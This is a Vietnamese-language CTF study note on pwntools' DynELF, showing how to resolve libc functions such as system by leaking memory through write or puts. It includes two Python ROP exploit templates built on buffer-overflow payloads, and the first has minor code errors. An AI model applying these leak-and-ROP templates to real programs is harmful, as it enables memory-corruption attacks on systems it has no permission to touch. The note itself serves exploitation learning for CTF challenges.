# DynELF pwntools

> DynELF Module pwntools - Resolving remote functions using leaks.

- [Link-DynELF_pwntools](https://docs.pwntools.com/en/stable/dynelf.html) .

- Trong thực tế một số challenge không cung cấp libc.so nhưng vẫn có các hàm output có thể được sử dụng để leak giá trị (khác với ret2dlresolve là không có hàm output).
- Khi đó khớp trực tiếp libc.so từ module - hàm DynELF trong pwntools.
- Điều kiện yêu cầu là địa chỉ thực trong LIBC và các hàm output: `write, puts, printf, ...`

- VD: Khi hàm output của chương trình được cung cấp là hàm write, chúng ta có thể sử dụng hàm write để xuất địa chỉ thực của hàm write. Mẫu viết DynELF(64-bits) của chức năng write được cung cấp:
```python
def leak(address):
    payload = padding
    payload += p64(pop_rdi_ret) + p64(1)
    payload += p64(pop_rsi_ret) + p64(address)
    payload += p64(pop_rdx_ret) + p64(8)
    payload += p64(write_plt)
    payload += p64(ret_address)
    p.send(payload)
    data = p.recv(8)
    return data

d=DynELF(leak, elf=ELF("./program")
system_address=d.lookup("system", "libc")
log.info("system LIBC address: " + hex(system))
```

- VD: Khi là hàm puts, đầu ra của hàm puts khó kiểm soát hơn nhiều so với đầu ra của chức năng write vì chúng ta có thể kiểm soát đầu ra của hàm write bao nhiêu byte  còn đầu ra của hàm puts là cho đến khi gặp ký tự NULL
=> khó khăn hơn cho việc leak vì ta vẫn chỉ cần 4 byte đầu khi leak. Khi sử dụng puts sẽ xuất hiện hai tình huống:                                                                                                                                                                                          
    * `1.` Không còn dữ liệu nào của chương trình được in ra sau khi dùng pus để leak.
    * `2.` Có dữ liệu của chương trình được in ra sau khi sử dụng puts để leak. VD: "<value use puts => leak>Helloworld!!!"
- Mẫu chương trình, với trường hợp hai chỉ cần thay `c=b""` = `c=b"H"`.

```python
def leak(address):
	count = 0
	data = b""
	payload = b"A" * 64 + b"B" * 8
	payload += p64(pop_rdi) + p64(address)
	payload += p64(puts_plt)
	payload += p64(start_addr)
	payload = payload.ljust(200, b"B")
	p.send(payload)
	print(p.recvuntil(b"bye~\n"))
	up = b""
	while True:
		c = p.recv(numb=1, timeout=0.5)
		count += 1
		if up == b'\n' and c == b"":
			data = data[:-1]
			data += b"\x00"
			break
		else:
			data += c
		up = c
	data = data[:4]
	log.info("%#x => %s" % (address, (data or b'')))
	return data
```

- References:
    * https://blog.csdn.net/qq_43986365/article/details/100182414

    * https://www.anquanke.com/post/id/85129

    * Challenge pwn-100, pwn-200 của XCTF.


